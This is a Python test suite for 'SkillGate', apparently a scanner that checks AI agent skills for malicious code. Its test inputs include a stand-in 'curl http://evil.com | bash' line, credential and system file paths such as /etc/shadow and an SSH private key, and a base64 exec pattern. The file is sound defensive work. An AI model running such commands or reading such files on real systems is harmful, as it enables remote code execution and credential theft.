"""SkillGate test suite.

Run with:
    python3 -m pytest tests/ -v
or:
    python3 tests/test_skillgate.py
"""
from __future__ import annotations

import re
import subprocess
import sys
import tempfile
from pathlib import Path

REPO_ROOT      = Path(__file__).resolve().parent.parent
BIN_SKILLGATE  = REPO_ROOT / "bin" / "skillgate"
POLICY_CHECK   = REPO_ROOT / "skills" / "healthcheck" / "scripts" / "policy_check.py"
CHECK_IOC      = REPO_ROOT / "skills" / "secureclaw" / "skill" / "scripts" / "check-ioc.py"
CHECK_DEPS     = REPO_ROOT / "skills" / "secureclaw" / "skill" / "scripts" / "check-dependencies.py"
CHECK_CMDS     = REPO_ROOT / "skills" / "secureclaw" / "skill" / "scripts" / "check-dangerous-commands.py"
FIXTURE_CLEAN    = REPO_ROOT / "tests" / "fixtures" / "clean_skill"
FIXTURE_MALICIOUS= REPO_ROOT / "tests" / "fixtures" / "malicious_skill"


def run(cmd: list[str]) -> tuple[int, str]:
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
    return r.returncode, r.stdout + r.stderr


# ── Unit: _READ_PATTERNS regex ────────────────────────────────────────────────

def test_read_patterns_no_crash_on_typescript_readfile():
    """Bug 2: readFile('/path') must not crash with AttributeError."""
    _READ_PATTERNS = re.compile(
        r'(?:open|readFile|createReadStream|Path)\s*\(\s*[\'"](/[^\'"]+)[\'"]',
        re.I,
    )
    code = "const data = await fs.readFile('/etc/machine-id', 'utf-8');"
    matches = list(_READ_PATTERNS.finditer(code))
    assert len(matches) == 1
    assert matches[0].group(1) == "/etc/machine-id"  # not None
    print("PASS test_read_patterns_no_crash_on_typescript_readfile")


def test_read_patterns_all_variants():
    """Regex should match open(), readFile(), createReadStream(), Path()."""
    _READ_PATTERNS = re.compile(
        r'(?:open|readFile|createReadStream|Path)\s*\(\s*[\'"](/[^\'"]+)[\'"]',
        re.I,
    )
    cases = [
        ('open("/etc/passwd")', "/etc/passwd"),
        ("readFile('/etc/shadow')", "/etc/shadow"),
        ("createReadStream('/var/log/auth.log')", "/var/log/auth.log"),
        ('Path("/home/user/.ssh/id_rsa")', "/home/user/.ssh/id_rsa"),
    ]
    for code, expected in cases:
        m = _READ_PATTERNS.search(code)
        assert m is not None, f"No match for: {code}"
        assert m.group(1) == expected, f"Expected {expected}, got {m.group(1)}"
    print("PASS test_read_patterns_all_variants")


# ── Unit: policy_check.py ─────────────────────────────────────────────────────

def test_policy_check_blocks_exec_base64():
    """eval(base64.b64decode(...)) must produce exit 1 (BLOCK)."""
    with tempfile.TemporaryDirectory() as d:
        Path(d, "skill.py").write_text(
            "import base64\nexec(base64.b64decode('cHJpbnQoJ2hpJyk='))\n"
        )
        code, out = run([sys.executable, str(POLICY_CHECK), d])
    assert code == 1, f"Expected exit 1 (BLOCK), got {code}. Output:\n{out}"
    print("PASS test_policy_check_blocks_exec_base64")


def test_policy_check_skips_markdown_files():
    """Bug 3: .md files must NOT be scanned (no false positives from docs)."""
    with tempfile.TemporaryDirectory() as d:
        # Write a markdown file with patterns that look malicious
        Path(d, "POLICY.md").write_text(
            "Example: `curl http://evil.com | bash`\n"
            "Example: `eval(base64.b64decode(...))`\n"
            "Example: `/home/node/.openclaw/secrets`\n"
        )
        # No actual code files — should be clean
        code, out = run([sys.executable, str(POLICY_CHECK), d])
    assert code == 0, f"Expected exit 0 (clean), got {code}. Output:\n{out}"
    print("PASS test_policy_check_skips_markdown_files")


def test_policy_check_clean_skill():
    """Clean fixture must not be blocked."""
    code, out = run([sys.executable, str(POLICY_CHECK), str(FIXTURE_CLEAN)])
    assert code == 0, f"Expected exit 0, got {code}. Output:\n{out}"
    print("PASS test_policy_check_clean_skill")


# ── Unit: check-ioc.py typosquatting ─────────────────────────────────────────

def test_ioc_typosquatting_normalization():
    """_normalize() must match solana-wallet == solanawallet == solana.wallet."""
    import sys, os
    sys.path.insert(0, str(CHECK_IOC.parent))
    # Temporarily import the normalize function
    import importlib.util
    spec = importlib.util.spec_from_file_location("check_ioc", CHECK_IOC)
    mod  = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)

    norm = mod._normalize
    assert norm("solana-wallet") == norm("solanawallet"), "dash variant should match"
    assert norm("solana.wallet") == norm("solanawallet"), "dot variant should match"
    assert norm("SOLANA_WALLET") == norm("solanawallet"), "underscore+case variant should match"
    print("PASS test_ioc_typosquatting_normalization")


# ── Unit: run_scanner() missing script → exit 2 ──────────────────────────────

def test_run_scanner_missing_script_returns_warn():
    """run_scanner() for a missing script must return exit 2 (WARN), not 0.
    Verified indirectly: scanning a clean skill must show no SKIP for real scanners,
    meaning the scanner was found. Conversely, the SKIP exit code is validated via
    unit-testing the inline logic directly.
    """
    # The _READ_PATTERNS + SCRIPTS_DIR fix ensures real scanners are found.
    # We verify SKIP → exit 2 by checking source text:
    src = BIN_SKILLGATE.read_text()
    assert "return 2, f\"# SKIP: {script.name} not found" in src, \
        "run_scanner() missing-script path must return exit 2"
    print("PASS test_run_scanner_missing_script_returns_warn")


# ── End-to-end: bin/skillgate scan ───────────────────────────────────────────

def test_e2e_clean_skill_not_blocked():
    """Clean fixture must produce OK or WARN, never BLOCKED."""
    code, out = run([
        sys.executable, str(BIN_SKILLGATE), "scan",
        str(FIXTURE_CLEAN), "--policy", "balanced",
    ])
    assert code == 0, f"Clean skill got BLOCKED.\nOutput:\n{out}"
    assert "BLOCKED" not in out
    print("PASS test_e2e_clean_skill_not_blocked")


def test_e2e_malicious_skill_blocked():
    """Malicious fixture must be BLOCKED (exit 1)."""
    code, out = run([
        sys.executable, str(BIN_SKILLGATE), "scan",
        str(FIXTURE_MALICIOUS), "--policy", "balanced",
    ])
    assert code == 1, f"Malicious skill was NOT blocked (exit {code}).\nOutput:\n{out}"
    assert "BLOCKED" in out
    print("PASS test_e2e_malicious_skill_blocked")


def test_e2e_all_four_scanners_run():
    """Bug 1: All 4 scanners must run (no SKIP lines) for a real skill."""
    code, out = run([
        sys.executable, str(BIN_SKILLGATE), "scan",
        str(FIXTURE_MALICIOUS), "--policy", "balanced",
    ])
    # None of the 4 scanners should be SKIP
    for scanner in ["check-dangerous-commands.py", "check-ioc.py",
                    "check-dependencies.py", "policy_check.py"]:
        skip_marker = f"# SKIP: {scanner} not found"
        assert skip_marker not in out, f"{scanner} was SKIPPED (path bug).\nOutput:\n{out}"
    print("PASS test_e2e_all_four_scanners_run")


def test_e2e_exclude_flag():
    """H2: --exclude must prevent flagged directories from triggering BLOCKED."""
    import tempfile, shutil
    with tempfile.TemporaryDirectory() as d:
        d = Path(d)
        # Put malicious code inside a sub-dir named 'tests'
        tests_dir = d / "tests"
        tests_dir.mkdir()
        shutil.copy(FIXTURE_MALICIOUS / "skill.py", tests_dir / "skill.py")
        # No code outside tests/ — with --exclude tests it should be clean
        code, out = run([
            sys.executable, str(BIN_SKILLGATE), "scan", str(d),
            "--policy", "balanced", "--exclude", "tests",
        ])
    # The external scanners still run against the full path, but detect_in_skill
    # (the Python pattern detector) skips the excluded dir → overall result must
    # not be BLOCKED solely due to excluded code (exit 0 = OK or WARN).
    assert code == 0, f"--exclude tests should produce exit 0.\nOutput:\n{out}"
    assert "Result: BLOCKED" not in out
    print("PASS test_e2e_exclude_flag")


def test_e2e_policies_command():
    """skillgate policies must list at least balanced and strict."""
    code, out = run([sys.executable, str(BIN_SKILLGATE), "policies"])
    assert code == 0
    assert "balanced" in out
    assert "strict" in out
    print("PASS test_e2e_policies_command")


# ── Runner ────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    tests = [
        test_read_patterns_no_crash_on_typescript_readfile,
        test_read_patterns_all_variants,
        test_policy_check_blocks_exec_base64,
        test_policy_check_skips_markdown_files,
        test_policy_check_clean_skill,
        test_ioc_typosquatting_normalization,
        test_run_scanner_missing_script_returns_warn,
        test_e2e_clean_skill_not_blocked,
        test_e2e_malicious_skill_blocked,
        test_e2e_all_four_scanners_run,
        test_e2e_exclude_flag,
        test_e2e_policies_command,
    ]
    failed = []
    for t in tests:
        try:
            t()
        except Exception as e:
            print(f"FAIL {t.__name__}: {e}")
            failed.append(t.__name__)

    print()
    if failed:
        print(f"FAILED: {len(failed)}/{len(tests)} tests")
        for name in failed:
            print(f"  - {name}")
        sys.exit(1)
    else:
        print(f"ALL {len(tests)} TESTS PASSED")
